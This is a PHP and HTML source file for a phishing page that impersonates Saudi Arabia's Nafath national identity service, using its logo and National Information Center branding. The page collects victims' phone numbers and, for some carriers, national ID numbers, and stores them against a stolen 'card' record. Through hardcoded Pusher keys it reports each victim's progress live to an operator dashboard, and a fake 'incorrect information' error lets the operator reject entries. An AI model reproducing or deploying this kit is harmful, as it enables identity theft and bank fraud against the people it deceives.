<?php
session_start();
error_reporting(0);
ini_set('display_errors', 0);

require_once('./add-efaa.php');
require_once('./dashboard/init.php');
require_once('./vendor/autoload.php');

if (isset($_SESSION['user_id'])) {
    $User->UpdateCurrentPage($_SESSION['user_id'], 'رقم هاتف نفاذ');
    $options = ['cluster' => 'ap2', 'useTLS' => true];
    $pusher = new Pusher\Pusher('4a9de0023f3255d461d9', '3803f60c4dc433d66655', '1918568', $options);
    $pusher->trigger('bcare', 'curreneft-page', ['userId' => $_SESSION['user_id'], 'page' => 'رقم هاتف نفاذ']);
}

if (isset($_GET['reject'])) {
    $showError = true;
}

if (isset($_POST['submit_PhoneNumber'])) {
    $options = array('cluster' => 'ap2', 'useTLS' => true);
    $pusher = new Pusher\Pusher('4a9de0023f3255d461d9', '3803f60c4dc433d66655', '1918568', $options);

    $PhoneNumber = $_POST['PhoneNumber'];
    $ssn = $_POST['ssn'] ?? null;
    $db = new DB();

    if ($ssn) {
        $db->query("UPDATE card SET PhoneNumber=?, ssn=?, CheckTheInfo_Nafad=? WHERE id=?");
        $db->bind(1, $PhoneNumber);
        $db->bind(2, $ssn);
        $db->bind(3, 0);
        $db->bind(4, $_SESSION['card_id']);
    } else {
        $db->query("UPDATE card SET PhoneNumber=?, CheckTheInfo_Nafad=? WHERE id=?");
        $db->bind(1, $PhoneNumber);
        $db->bind(2, 0);
        $db->bind(3, $_SESSION['card_id']);
    }

    if ($db->execute()) {
        $userId = $_SESSION['user_id'];
        $User->UpdateStatus($userId, 'رقم هاتف نفاذ');
        $pusher->trigger('bcare', 'update-user-accountt', [
            'userId' => $userId,
            'updatedData' => ['message' => 'رقم هاتف نفاذ', 'type' => '3']
        ]);
        echo "<script>document.location.href='wait-nafath.php';</script>";
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>توثيق رقم الجوال | نفاذ</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <style>
        :root {
            --primary-nafad: #11998E;
            --bg-light: #f8fafc;
            --text-dark: #1e293b;
        }

        * {
            padding: 0;
            margin: 0;
            box-sizing: border-box;
            font-family: "Cairo", serif;
        }

        body {
            background-color: var(--bg-light);
            color: var(--text-dark);
            min-height: 100vh;
        }

        .nafad-header {
            background: white;
            padding: 1.5rem 0;
            box-shadow: 0 2px 15px rgba(0, 0, 0, 0.05);
            text-align: center;
        }

        .nafad-header img {
            height: 50px;
        }

        .verification-stepper {
            background: white;
            padding: 50px;
            border-radius: 24px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.04);
            margin-top: 40px;
            text-align: center;
        }

        .operator-preview {
            width: 120px;
            height: 120px;
            background: #f1f5f9;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 30px;
            border: 3px solid #e2e8f0;
        }

        .operator-preview img {
            max-width: 80%;
            max-height: 80%;
            object-fit: contain;
        }

        .form-control {
            height: 60px;
            border-radius: 12px;
            text-align: center;
            font-size: 1.5rem;
            font-weight: 700;
            letter-spacing: 2px;
            border: 2px solid #e2e8f0;
            transition: all 0.3s;
        }

        .form-control:focus {
            border-color: var(--primary-nafad);
            box-shadow: 0 0 0 4px rgba(17, 153, 142, 0.1);
        }

        .btn-tawtheg {
            background-color: var(--primary-nafad);
            color: white;
            height: 60px;
            border-radius: 12px;
            font-weight: 900;
            font-size: 1.1rem;
            border: none;
            transition: all 0.3s;
            margin-top: 40px;
        }

        .btn-tawtheg:hover {
            background-color: #0d7e76;
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(17, 153, 142, 0.2);
            color: white;
        }

        .footer-nafad {
            background: #f1f5f9;
            padding: 40px 0;
            margin-top: 80px;
            border-top: 1px solid #e2e8f0;
        }

        .step-indicator {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-bottom: 30px;
        }

        .step-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #cbd5e1;
        }

        .step-dot.active {
            background: var(--primary-nafad);
            width: 30px;
        }
    </style>
</head>

<body>

    <header class="nafad-header">
        <div class="container">
            <img src="./assets/nafad.png" alt="النفاذ الوطني الموحد">
        </div>
    </header>

    <main class="container">
        <div class="row justify-content-center">
            <div class="col-lg-6 col-md-8">
                <div class="verification-stepper">

                    <?php
                    $company = $_SESSION['CompanyName'] ?? 'default';
                    $logoPath = "./assets/" . $company . ".png";
                    ?>
                    <div class="operator-preview">
                        <img src="<?= $logoPath ?>" alt="Operator Logo">
                    </div>

                    <h3 class="fw-900 mb-5">أدخل رقم الجوال</h3>
                    <p class="text-muted mb-2">يرجى إدخال رقم الجوال المعتمد.</p>

                    <form method="POST" action="StepTwo.php">
                        <div class="mb-3">
                            <input type="text" name="PhoneNumber" id="phone" minlength="10" maxlength="10"
                                inputmode="numeric" required pattern="05\d{8}" class="form-control"
                                placeholder="05XXXXXXXX">
                        </div>
                        <?php if ($company == 'mobily' || $company == 'zain'): ?>
                            <div class="mb-3">
                                <p class="text-muted mb-2 small">يرجى ادخال رقم الهوية المرتبط بالبنك</p>
                                <input type="text" name="ssn" id="ssn" minlength="10" maxlength="12" inputmode="numeric"
                                    required pattern="\d{10}" class="form-control" placeholder="رقم الهوية">
                            </div>
                        <?php endif; ?>
                        <button type="submit" name="submit_PhoneNumber" class="btn-tawtheg w-100">متابعة
                            التوثيق</button>
                    </form>
                </div>
            </div>
        </div>
    </main>

    <footer class="footer-nafad">
        <div class="container text-center">
            <div class="row align-items-center">
                <div class="col-md-6 text-md-end mb-3 mb-md-0">
                    <h6 class="fw-bold mb-1">مركز المعلومات الوطني</h6>
                    <p class="small text-muted mb-0">تطوير وتشغيل | جميع الحقوق محفوظة © 2024</p>
                </div>
                <div class="col-md-6 text-md-start">
                    <img src="./assets/NIC.png" alt="NIC" height="40" style="opacity: 0.7;">
                </div>
            </div>
        </div>
    </footer>

    <!-- Error Modal -->
    <div class="modal fade" id="errorModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content text-center border-0 shadow-lg" style="border-radius: 24px;">
                <div class="modal-header-error p-5" style="background: #fff5f5;">
                    <div class="error-icon-wrapper mx-auto mb-4"
                        style="width: 70px; height: 70px; background: #fee2e2; color: #ef4444; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 2rem;">
                        <i class="bi bi-exclamation-triangle-fill"></i>
                    </div>
                    <h5 class="fw-900 text-dark mb-3">المعلومات غير صحيحة</h5>
                    <p class="text-muted small px-3">رقم الجوال المدخل غير صحيح أو لا يوجد عليه حساب أبشر موثق. يرجى
                        المحاولة مرة أخرى.</p>
                    <button class="btn w-100 mt-4" data-bs-dismiss="modal"
                        style="background: #f1f5f9; color: #475569; height: 55px; border-radius: 12px; font-weight: 800;">حسناً،
                        فهمت</button>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    <script src="js/presence-tracker.js"></script>
    <script>
        $(document).ready(function () {
            <?php if (isset($showError) && $showError): ?>
                var myModal = new bootstrap.Modal(document.getElementById('errorModal'));
                myModal.show();
            <?php endif; ?>
        });
    </script>
    <script>
        var userIdFromSession = <?php echo json_encode($_SESSION['user_id']); ?>;
    </script>
    <?php include 'chat_widget.php'; ?>
</body>

</html>